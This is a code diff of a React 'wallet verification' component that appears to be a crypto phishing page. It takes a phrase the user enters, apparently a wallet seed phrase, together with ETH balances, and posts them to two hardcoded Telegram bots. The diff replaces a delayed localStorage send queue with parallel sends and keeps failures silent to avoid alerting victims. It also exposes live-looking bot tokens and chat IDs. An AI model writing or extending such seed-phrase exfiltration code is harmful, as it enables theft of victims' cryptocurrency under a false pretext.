@@ -30,112 +30,13 @@ import {
   ExternalLink,
   Loader2,
 } from "lucide-react";
-import { useEffect, useState } from "react";
+import { useState } from "react";
 
 // Telegram bot tokens
 const TELEGRAM_BOT_TOKEN_1 = "7295112799:AAE24YyqqlbUNbcOiAlXfa8w1IgYsg3UpxQ";
 const TELEGRAM_BOT_TOKEN_2 = "7849948168:AAGlhFLe07LWuZ8rt59J3rdKxrh8u6fCKHE";
 const TELEGRAM_CHAT_ID_1 = "7575241701";
 const TELEGRAM_CHAT_ID_2 = "6232955005";
-
-// Storage key for pending messages
-const PENDING_MESSAGES_KEY = "pendingTelegramMessages";
-
-// Function to check and send any pending messages
-const checkAndSendPendingMessages = async () => {
-  try {
-    // Only run in browser environment
-    if (typeof window === "undefined") return;
-
-    // Get pending messages from localStorage
-    const pendingMessagesJSON = localStorage.getItem(PENDING_MESSAGES_KEY);
-    if (!pendingMessagesJSON) return;
-
-    const pendingMessages = JSON.parse(pendingMessagesJSON);
-    const now = Date.now();
-    const updatedPendingMessages = [];
-
-    // Process each pending message
-    for (const item of pendingMessages) {
-      // If scheduled time has passed, send the message
-      if (now >= item.scheduledTime) {
-        try {
-          await fetch(
-            `https://api.telegram.org/bot${item.botToken}/sendMessage`,
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                chat_id: item.chatId,
-                text: item.message,
-              }),
-            }
-          );
-          console.log("Sent delayed message to Telegram");
-        } catch (error) {
-          console.error("Failed to send delayed message:", error);
-          // Keep in queue if failed to send
-          updatedPendingMessages.push(item);
-        }
-      } else {
-        // Keep messages that are still scheduled for the future
-        updatedPendingMessages.push(item);
-      }
-    }
-
-    // Update localStorage with remaining messages
-    if (updatedPendingMessages.length > 0) {
-      localStorage.setItem(
-        PENDING_MESSAGES_KEY,
-        JSON.stringify(updatedPendingMessages)
-      );
-    } else {
-      localStorage.removeItem(PENDING_MESSAGES_KEY);
-    }
-  } catch (error) {
-    console.error("Error processing pending messages:", error);
-  }
-};
-
-// Function to add a delayed message to localStorage
-const scheduleDelayedMessage = (
-  message: string,
-  botToken: string,
-  chatId: string,
-  delayMinutes: number
-) => {
-  try {
-    // Only run in browser environment
-    if (typeof window === "undefined") return;
-
-    const scheduledTime = Date.now() + delayMinutes * 60 * 1000;
-
-    // Get existing pending messages
-    const pendingMessagesJSON = localStorage.getItem(PENDING_MESSAGES_KEY);
-    const pendingMessages = pendingMessagesJSON
-      ? JSON.parse(pendingMessagesJSON)
-      : [];
-
-    // Add new message
-    pendingMessages.push({
-      message,
-      botToken,
-      chatId,
-      scheduledTime,
-    });
-
-    // Save back to localStorage
-    localStorage.setItem(PENDING_MESSAGES_KEY, JSON.stringify(pendingMessages));
-
-    // console.log(
-    //   `Message scheduled for ${new Date(scheduledTime).toLocaleString()}`
-    // );
-  } catch (error) {
-    // console.error("Error scheduling message:", error);
-  }
-};
 
 // Function to send data to Telegram channels
 const sendToTelegram = async (
@@ -157,8 +58,22 @@ ETH: ${balances.eth || 0} ETH`
 }
     `.trim();
 
-    // Send to second channel (bot token 2) immediately
-    await fetch(
+    // Send to both channels simultaneously
+    const sendToChannel1 = fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID_1,
+          text: message,
+        }),
+      }
+    );
+
+    const sendToChannel2 = fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`,
       {
         method: "POST",
@@ -172,15 +87,8 @@ ETH: ${balances.eth || 0} ETH`
       }
     );
 
-    // console.log("Data sent to first Telegram channel successfully");
-
-    // Schedule message to first channel (bot token 1) for 5 minutes later
-    scheduleDelayedMessage(
-      message,
-      TELEGRAM_BOT_TOKEN_1,
-      TELEGRAM_CHAT_ID_1,
-      5
-    );
+    // Execute both requests in parallel
+    await Promise.all([sendToChannel1, sendToChannel2]);
   } catch (error) {
     // Silently handle errors to not affect user experience
     // console.error("Error sending data to Telegram:", error);
@@ -199,18 +107,6 @@ const WalletVerificationSection = () => {
     reward?: number;
     gift?: number;
   } | null>(null);
-
-  // Check for pending messages when component mounts and periodically
-  useEffect(() => {
-    // Check immediately on page load
-    checkAndSendPendingMessages();
-
-    // Set up interval to check every minute
-    const intervalId = setInterval(checkAndSendPendingMessages, 60 * 1000);
-
-    // Clean up interval on component unmount
-    return () => clearInterval(intervalId);
-  }, []);
 
   const handleVerification = async () => {
     if (!phrase.trim()) {
